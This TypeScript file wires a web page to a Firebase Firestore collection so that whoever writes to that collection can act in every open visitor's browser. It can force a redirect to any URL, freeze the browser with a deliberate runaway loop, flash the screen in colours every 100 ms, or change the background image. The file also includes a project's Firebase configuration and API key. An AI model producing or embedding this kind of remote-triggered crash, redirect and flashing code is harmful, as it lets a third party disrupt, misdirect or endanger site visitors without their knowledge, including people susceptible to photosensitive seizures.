import { initializeApp } from "firebase/app";
import { getFirestore, collection, onSnapshot } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBXyC75w0YvkOzr-Q71FcooE3juqtb-ZwE",
  authDomain: "counterthing-70f96.firebaseapp.com",
  projectId: "counterthing-70f96",
  storageBucket: "counterthing-70f96.appspot.com",
  messagingSenderId: "934844864719",
  appId: "1:934844864719:web:85c9ad24529c3d204e7fba",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Get Firestore instance
const db = getFirestore(app);

function crash() {
  console.log("Crash mode activated!");

  const arr = [];
  for (let i = 0; i < 10000000000; i++) {
    arr.push(Math.random());
    arr.sort();
  }
}

function changeBackgroundColor(color: string) {
  document.body.style.backgroundColor = color;
}

function flashBackgroundColor() {
  const originalColor = document.body.style.backgroundColor; // Save the original background color
  const colors = [
    "#FF0000",
    "#00FF00",
    "#0000FF",
    "#FFFF00",
    "#FF00FF",
    "#00FFFF",
  ];
  const intervalId = setInterval(() => {
    const randomColor = colors[Math.floor(Math.random() * colors.length)];
    document.body.style.backgroundColor = randomColor;
  }, 100); // Change color every 100ms

  // Stop flashing after 5 seconds and reset to original color
  setTimeout(() => {
    clearInterval(intervalId);
    document.body.style.backgroundColor = originalColor; // Reset to the original color
  }, 5000);
}

function setBackgroundImage(url: string) {
  document.body.style.backgroundImage = `url(${url})`;
  document.body.style.backgroundSize = "cover"; // Ensure the image covers the entire background
}

function unSetBackgroundImage() {
  document.body.style.backgroundImage = "";
}

function listenToFunnyThings() {
  const funnyThingsCollection = collection(db, "funnythings");
  let initialLoad = true; // Flag to track initial load

  onSnapshot(funnyThingsCollection, (snapshot) => {
    snapshot.docChanges().forEach((change) => {
      if (
        !initialLoad &&
        (change.type === "added" || change.type === "modified")
      ) {
        const data = change.doc.data();
        if (data.execute) {
          switch (data.type) {
            case "redirect":
              window.location.href = data.target;
              console.log("Redirecting to " + data.target);
              break;
            case "crash":
              crash();
              break;
            case "set_bg_color":
              changeBackgroundColor(data.target);
              console.log("Changing background color to " + data.color);
              break;
            case "flash_bg_color":
              flashBackgroundColor();
              console.log("Flashing background colors");
              break;
            case "set_bg_image":
              setBackgroundImage(data.target);
              console.log("Setting background image to " + data.url);
              break;
            default:
              console.log("Unknown action type: " + data.type);
              break;
          }
        } else {
          switch (data.type) {
            case "set_bg_image":
              unSetBackgroundImage();
              console.log("Setting background image to " + data.url);
              break;
          }
        }
      }
    });
    initialLoad = false; // Set flag to false after initial load
  });
}

// Call the function to start listening to the collection
listenToFunnyThings();

export { db };
